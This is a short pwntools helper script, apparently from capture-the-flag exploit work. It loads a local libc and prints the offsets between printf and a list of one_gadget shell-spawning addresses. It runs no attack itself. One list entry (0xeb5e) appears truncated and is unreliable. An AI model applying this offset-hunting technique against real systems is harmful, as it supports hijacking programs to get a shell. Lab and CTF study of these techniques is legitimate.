from pwn import *

REMOTE = False


libc = ELF("./libc.so.6")

printf_libc_offset = libc.symbols["printf"]
system_libc_offset = libc.symbols["system"]
fgets_libc_offset = libc.symbols["fgets"]

#one_gadget_offsets = [0x54ecc, 0x54ed3, 0xeb58e, 0xeb5eb]
one_gadget_offsets = [0x54ec5, 0x54ecc, 0x54ed3, 0x54eda, 0x54edf, 0x54ee7, 0x54eee, 0x54ef2, 0x83023, 0x8302a, 0x83031, 0x83036, 0x8303e, 0x83043, 0x83048, 0x8304d, 0x83076, 0xeb58e, 0xeb5e, 0x11060a, 0x110612, 0x110617, 0x110621]

print("Printf")
for i in range(len(one_gadget_offsets)):
    print(f"{i} - {hex(printf_libc_offset - one_gadget_offsets[i])} - {hex(one_gadget_offsets[i])}")

# print("Fgets")
# for i in range(len(one_gadget_offsets)):
#     print(f"{i} - {hex(fgets_libc_offset - one_gadget_offsets[i])} - {hex(one_gadget_offsets[i])}")

#print(libc.symbols["_IO_2_1_stdin_"] + 131)